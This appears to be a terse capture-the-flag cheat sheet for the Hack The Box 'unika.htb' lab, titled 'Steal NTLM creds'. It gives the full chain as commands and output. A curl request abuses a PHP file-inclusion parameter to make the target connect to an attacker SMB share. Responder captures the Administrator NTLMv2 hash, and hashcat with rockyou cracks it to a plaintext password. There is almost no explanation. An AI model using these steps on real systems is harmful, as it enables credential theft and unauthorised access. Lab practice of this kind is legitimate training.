# Steal NTLM creds

## LFI

```Config Responder
$ cat /opt/Responder/Responder.conf 
[Responder Core]

; Servers to start
SQL = On
SMB = On
RDP = On
[SNIP]
```

```curl
$ curl http://unika.htb/?page=//10.10.14.39/somefile
<br />
<b>Warning</b>:  include(\\10.10.14.39\SOMEFILE): Failed to open stream: Permission denied in <b>C:\xampp\htdocs\index.php</b> on line <b>11</b><br />
<br />
<b>Warning</b>:  include(): Failed opening '//10.10.14.39/somefile' for inclusion (include_path='\xampp\php\PEAR') in <b>C:\xampp\htdocs\index.php</b> on line <b>11</b><br />
```

```Responder
$ sudo python3 Responder.py -I tun0                                                              
                                         __                                                                                  
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.                                                                     
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|                                                                     
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                                                                       
                   |__|                                                                                                      
                                                                                                                             
           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
        
`[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.127.163
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:c06dc8c852549491:9A32F9EB119582E576D5836A64E9D0B9:010100000000000000A2D9
6C1522D90173982418FD8ED2B900000000020008004A0032003500520001001E00570049004E002D004400460042004F005A0033004D004500590054005A0
004003400570049004E002D004400460042004F005A0033004D004500590054005A002E004A003200350052002E004C004F00430041004C00030014004A00
3200350052002E004C004F00430041004C00050014004A003200350052002E004C004F00430041004C000700080000A2D96C1522D90106000400020000000
800300030000000000000000100000000200000841682066AD701545DC2F71628A3C8E472890D3FC4B4B65008753D4C20A9CF6D0A00100000000000000000
0000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330039000000000000000000
```

```Crack by hashcat
$ hashcat -m 5600 hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.2.6) starting
[SKIP]
ADMINISTRATOR::RESPONDER:c06dc8c852549491:9a32f9eb119582e576d5836a64e9d0b9:010100000000000000a2d96c1522d90173982418fd8ed2b900
000000020008004a0032003500520001001e00570049004e002d004400460042004f005a0033004d004500590054005a0004003400570049004e002d00440
0460042004f005a0033004d004500590054005a002e004a003200350052002e004c004f00430041004c00030014004a003200350052002e004c004f004300
41004c00050014004a003200350052002e004c004f00430041004c000700080000a2d96c1522d901060004000200000008003000300000000000000001000
00000200000841682066ad701545dc2f71628a3c8e472890d3fc4b4b65008753d4c20a9cf6d0a001000000000000000000000000000000000000900200063
006900660073002f00310030002e00310030002e00310034002e00330039000000000000000000:badminton
[SKIP]
```
